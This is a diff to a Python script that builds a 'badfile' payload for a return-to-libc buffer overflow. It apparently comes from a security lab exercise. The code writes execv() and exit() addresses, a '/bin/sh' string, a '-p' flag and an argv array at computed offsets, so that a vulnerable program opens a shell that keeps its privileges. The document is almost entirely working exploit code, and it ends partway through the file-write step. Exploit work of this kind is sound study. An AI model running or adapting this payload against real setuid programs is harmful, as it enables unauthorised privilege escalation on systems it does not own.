@@ -1,32 +1,40 @@
 #!/usr/bin/python3
 import sys
 # Fill content with non-zero values
-content = bytearray(0xaa for i in range(500))
-main_addr = 0x804856B
-req_array = 100 
+content = bytearray(0xaa for i in range(300))
 
-Y = 28
+buffer_start = 0xbfffeb6e
+sh_str = b"/bin/sh\x00"
+p_str = b"-p\x00"
+
+sh_str_offset = 100
+p_str_offset = 110
+sh_addr = buffer_start + sh_str_offset
+p_addr = buffer_start + p_str_offset
+
+content[sh_str_offset:sh_str_offset+len(sh_str)] = sh_str
+content[p_str_offset:p_str_offset+len(p_str)] = p_str
+
+offset = 42
+Y = offset + 4
 execv_addr = 0xb7eb8780 # The address of execv()
 content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')
 
-Z = 28 + 4
+Z = offset + 8
 exit_addr = 0xb7e369d0 # The address of exit()
 content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
 
-X = 28 + 8
-sh_addr = 0xbffffdd2 # The address of "/bin/sh"
+X = offset + 12
 content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
 
-W = 28 + 12
-argv = main_addr + req_array
+W =offset + 16
+argv = buffer_start + offset + 20
 content[W:W+4] = (argv).to_bytes(4, byteorder='little')
 
-p_addr = 0xbffff86b
 # Create argument array
-content[req_array:req_array+4] = (sh_addr).to_bytes(4, byteorder='little')
-content[req_array+4:req_array+8] = (p_addr).to_bytes(4, byteorder='little')
-content[req_array+8:req_array+12] = (0x00).to_bytes(4, byteorder='little')
-
+content[offset + 20:offset + 24] = (sh_addr).to_bytes(4, byteorder='little')
+content[offset + 24:offset + 28] = (p_addr).to_bytes(4, byteorder='little')
+content[offset + 20 +8:offset + 20 +12] = (0x00).to_bytes(4, byteorder='little')
 
 # Save content to a file
 with open("badfile", "wb") as f:
